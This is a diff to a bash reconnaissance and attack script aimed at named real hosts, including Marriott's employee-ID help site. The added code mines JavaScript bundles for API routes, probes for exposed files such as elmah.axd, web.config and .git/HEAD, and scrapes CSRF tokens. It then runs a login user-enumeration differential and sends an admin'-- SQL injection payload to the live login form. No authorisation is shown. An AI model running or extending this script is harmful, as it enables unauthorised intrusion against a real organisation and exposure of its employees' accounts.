@@ -252,27 +252,67 @@ echo "======================================================================"
 BASE="https://eidhelp.marriott.com"
 
 echo ""
-echo "--- 3A. Root page ---"
+echo "--- 3A. Root page + CNAME chain verify ---"
+# Confirmed: eidhelp.marriott.com → eid-help.mi-mgs.com → CloudFront
+# HTTP 200 / 7767B with NO auth gate (unlike efast which returns 401)
 curl -sk -i "${BASE}/" | head -60
 echo ""
-echo "--- 3A2. Content mining ---"
+echo "--- 3A2. Content mining + JS bundle discovery ---"
 curl -sk "${BASE}/" | python3 -c "
 import sys, re
 html = sys.stdin.read()
-forms  = re.findall(r'<form[^>]*>(.*?)</form>', html, re.S|re.I)
-inputs = re.findall(r'<input[^>]*name=[\"\'](.*?)[\"\'`][^>]*>', html, re.I)
-apis   = re.findall(r'[\"\'](/(?:api|rest|svc|service)/[^\"\']{2,60})[\"\'`]', html, re.I)
+inputs   = re.findall(r'<input[^>]*name=[\"\'](.*?)[\"\'`][^>]*>', html, re.I)
+apis     = re.findall(r'[\"\'](/(?:api|rest|svc|service)/[^\"\']{2,60})[\"\'`]', html, re.I)
+scripts  = re.findall(r'src=[\"\'](.*?\.js[^\"\']*)[\"\'`]', html, re.I)
+links    = list(set(re.findall(r'href=[\"\'](/[^\"\']{2,80})[\"\'`]', html, re.I)))
 print('FORM_INPUTS:', inputs[:15])
 print('API_REFS:', sorted(set(apis))[:15])
+print('JS_BUNDLES:', scripts[:8])
+print('LINKS:', sorted(links)[:20])
 print('SIZE:', len(html))
 " 2>/dev/null
+
+echo ""
+echo "--- 3A3. JS bundle mining (critical — API routes hide here) ---"
+# Extract all <script src> from root page and mine each bundle
+BUNDLE_URLS=$(curl -sk "${BASE}/" | grep -oP 'src="([^"]+\.js[^"]*)"' | sed 's/src="//;s/"//')
+if [ -n "$BUNDLE_URLS" ]; then
+  echo "Found JS bundles:"
+  echo "$BUNDLE_URLS"
+  for burl in $BUNDLE_URLS; do
+    # Handle relative vs absolute URLs
+    if [[ "$burl" =~ ^/ ]]; then
+      full_url="${BASE}${burl}"
+    else
+      full_url="$burl"
+    fi
+    echo ""
+    echo "=== Mining: $full_url ==="
+    curl -sk --max-time 20 "$full_url" | python3 -c "
+import sys, re
+bundle = sys.stdin.read()
+# Extract API routes
+routes = re.findall(r'[\"'\'']\s*(/(?:api|v\d|rest|svc|service|employee|eid|lookup|reset|user)[^\"'\''\\s]{1,80})[\"'\'']', bundle)
+fetch_urls = re.findall(r'fetch\([\"'\''](/[^\"'\'']+)[\"'\'']', bundle)
+axios_urls = re.findall(r'axios\.[a-z]+\([\"'\''](/[^\"'\'']+)[\"'\'']', bundle)
+all_routes = sorted(set(routes + fetch_urls + axios_urls))
+print(f'Bundle size: {len(bundle)}B')
+print(f'API routes found: {len(all_routes)}')
+for r in all_routes[:40]:
+    print(f'  {r}')
+" 2>/dev/null
+  done
+else
+  echo "No JS bundles found in root page — may be SPA with inline script or CDN-hosted"
+fi
 
 echo ""
 echo "--- 3B. Path probe ---"
 for path in /api/ /api/v1/ /api/v1/users /api/v1/employees /api/v1/lookup \
             /reset /reset-password /forgot-password /unlock \
             /help /admin /health /status /info /robots.txt \
-            /api/employee /api/eid /lookup /identify; do
+            /api/employee /api/eid /lookup /identify \
+            /api/v1/reset /api/v1/verify /api/v1/validate; do
   probe "${BASE}${path}"
 done
 
@@ -328,62 +368,100 @@ print('SIZE:', len(html))
 " 2>/dev/null
 
 echo ""
-echo "--- 4C. Pre-auth path probe ---"
-for path in /robots.txt /sitemap.xml /api/ /api/v1/ /health /status \
-            /swagger /v2/api-docs /.git/HEAD /web.config \
-            /Admin/ /admin/ /Management/ /Content/ /Scripts/ \
-            /Login/ /Account/ /Register/ /api/values; do
+echo "--- 4C. Pre-auth path probe (ASP.NET MVC — elmah.axd is highest priority) ---"
+for path in /robots.txt /sitemap.xml /elmah.axd /web.config /web.config.bak \
+            /api/ /api/v1/ /api/v1/values /health /status \
+            /swagger /swagger/ui/index /v2/api-docs /v3/api-docs \
+            /.git/HEAD /App_Data/ /Scripts/ /Content/ \
+            /Admin/ /admin/ /Management/ /Account/ /Register/ \
+            /trace.axd /WebResource.axd; do
   probe "${BASE}${path}"
 done
 
 echo ""
-echo "--- 4D. Fetch live pre-auth paths ---"
-for path in /robots.txt /sitemap.xml /api/ /api/v1/ /health /.git/HEAD; do
+echo "--- 4D. Fetch live pre-auth paths (200/401/403) ---"
+for path in /robots.txt /sitemap.xml /elmah.axd /swagger \
+            /api/ /api/v1/ /health /.git/HEAD /web.config; do
   code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 "${BASE}${path}")
   if [[ "$code" =~ ^(200|401|403)$ ]]; then
     echo "=== LIVE: ${BASE}${path} (HTTP $code) ==="
     fetch "${BASE}${path}"
+    if [ "$path" = "/elmah.axd" ] && [ "$code" = "200" ]; then
+      echo "*** CRITICAL: ELMAH error log exposed — extract error details ***"
+    fi
   fi
 done
 
 echo ""
-echo "--- 4E. Login form test (boolean diff for user enum) ---"
-r1=$(curl -sk -o /tmp/bpa2_r1_$$.txt -w "%{http_code}" \
+echo "--- 4E. Extract CSRF token then run login differential + SQLi ---"
+# ASP.NET MVC uses __RequestVerificationToken — must extract before POST
+COOKIE_JAR="/tmp/bpa2_cookies_$$.txt"
+TOKEN_PAGE=$(curl -sk -c "$COOKIE_JAR" "${BASE}/Login/Login" 2>/dev/null)
+CSRF_TOKEN=$(echo "$TOKEN_PAGE" | python3 -c "
+import sys, re
+html = sys.stdin.read()
+# Try input hidden field
+m = re.search(r'name=\"__RequestVerificationToken\"[^>]*value=\"([^\"]+)\"', html)
+if not m:
+    m = re.search(r'value=\"([^\"]+)\"[^>]*name=\"__RequestVerificationToken\"', html)
+print(m.group(1) if m else 'NOT_FOUND')
+" 2>/dev/null)
+echo "CSRF_TOKEN: ${CSRF_TOKEN:0:40}..."
+echo "Login page size: $(echo "$TOKEN_PAGE" | wc -c)B"
+
+if [ "$CSRF_TOKEN" != "NOT_FOUND" ] && [ -n "$CSRF_TOKEN" ]; then
+  CSRF_PARAM="__RequestVerificationToken=${CSRF_TOKEN}&"
+else
+  CSRF_PARAM=""
+  echo "No CSRF token found — posting without it"
+fi
+
+# Test 1: known-format username (valid format)
+r1=$(curl -sk -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
+  -o /tmp/bpa2_r1_$$.txt -w "%{http_code}" \
   -X POST -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "username=admin&password=wrongpass" "${BASE}/Login/Login" --max-time 10)
+  -d "${CSRF_PARAM}Username=admin&Password=WrongPass123" \
+  "${BASE}/Login/Login" --max-time 10)
 s1=$(wc -c < /tmp/bpa2_r1_$$.txt 2>/dev/null || echo 0)
 
-r2=$(curl -sk -o /tmp/bpa2_r2_$$.txt -w "%{http_code}" \
+# Test 2: nonexistent format username
+CSRF_TOKEN2=$(curl -sk -c "$COOKIE_JAR" "${BASE}/Login/Login" | \
+  python3 -c "import sys,re; m=re.search(r'name=\"__RequestVerificationToken\"[^>]*value=\"([^\"]+)\"',sys.stdin.read()); print(m.group(1) if m else '')" 2>/dev/null)
+r2=$(curl -sk -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
+  -o /tmp/bpa2_r2_$$.txt -w "%{http_code}" \
   -X POST -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "username=nonexistent_zzz999@x.com&password=wrongpass" "${BASE}/Login/Login" --max-time 10)
+  -d "__RequestVerificationToken=${CSRF_TOKEN2}&Username=zzz_nonexistent_9x9@nowhere.invalid&Password=WrongPass123" \
+  "${BASE}/Login/Login" --max-time 10)
 s2=$(wc -c < /tmp/bpa2_r2_$$.txt 2>/dev/null || echo 0)
 
-echo "Login(admin/wrong):      HTTP $r1 / ${s1}B"
-echo "Login(nonexistent/wrong): HTTP $r2 / ${s2}B"
+echo "Login(admin/wrong):           HTTP $r1 / ${s1}B"
+echo "Login(nonexistent@x/wrong):   HTTP $r2 / ${s2}B"
 if [ "$s1" != "$s2" ] || [ "$r1" != "$r2" ]; then
-  echo "*** DIFFERENTIAL DETECTED — user enumeration candidate ***"
-  echo "=== Response 1 (admin) ==="
-  head -20 /tmp/bpa2_r1_$$.txt
-  echo "=== Response 2 (nonexistent) ==="
-  head -20 /tmp/bpa2_r2_$$.txt
+  echo "*** USER ENUM DIFFERENTIAL DETECTED ***"
+  echo "=== Response 1 tail (admin): ==="; tail -5 /tmp/bpa2_r1_$$.txt
+  echo "=== Response 2 tail (nonexistent): ==="; tail -5 /tmp/bpa2_r2_$$.txt
 fi
 rm -f /tmp/bpa2_r1_$$.txt /tmp/bpa2_r2_$$.txt
 
 echo ""
-echo "--- 4F. SQL injection probe on login (safe boolean only) ---"
-r3=$(curl -sk -o /tmp/bpa2_sqli_$$.txt -w "%{http_code}" \
+echo "--- 4F. SQLi probe on login (safe boolean-based, fresh token each time) ---"
+CSRF_TOKEN3=$(curl -sk -c "$COOKIE_JAR" "${BASE}/Login/Login" | \
+  python3 -c "import sys,re; m=re.search(r'name=\"__RequestVerificationToken\"[^>]*value=\"([^\"]+)\"',sys.stdin.read()); print(m.group(1) if m else '')" 2>/dev/null)
+r3=$(curl -sk -b "$COOKIE_JAR" \
+  -o /tmp/bpa2_sqli_$$.txt -w "%{http_code}" \
   -X POST -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "username=admin'--&password=x" "${BASE}/Login/Login" --max-time 10)
+  -d "__RequestVerificationToken=${CSRF_TOKEN3}&Username=admin'--&Password=x" \
+  "${BASE}/Login/Login" --max-time 10)
 s3=$(wc -c < /tmp/bpa2_sqli_$$.txt 2>/dev/null || echo 0)
 echo "Login(admin'--/x): HTTP $r3 / ${s3}B"
-if [ "$r3" = "200" ] && [ "$s3" -gt 1000 ]; then
-  echo "*** POSSIBLE SQLi — 200 on malformed input with large response ***"
-  head -30 /tmp/bpa2_sqli_$$.txt
-elif [ "$r3" = "500" ]; then
-  echo "*** POSSIBLE SQLi — 500 error on quote injection ***"
-  head -30 /tmp/bpa2_sqli_$$.txt
+if [ "$r3" = "500" ]; then
+  echo "*** CRITICAL: HTTP 500 on SQL quote injection — SQLi candidate ***"
+  head -40 /tmp/bpa2_sqli_$$.txt
+elif [ "$r3" = "200" ] && [ "$s3" -gt 500 ]; then
+  echo "*** POSSIBLE SQLi: 200 with large body on injected input ***"
+  head -20 /tmp/bpa2_sqli_$$.txt
 fi
-rm -f /tmp/bpa2_sqli_$$.txt
+rm -f /tmp/bpa2_sqli_$$.txt "$COOKIE_JAR"
 
 echo ""
 echo "======================================================================"
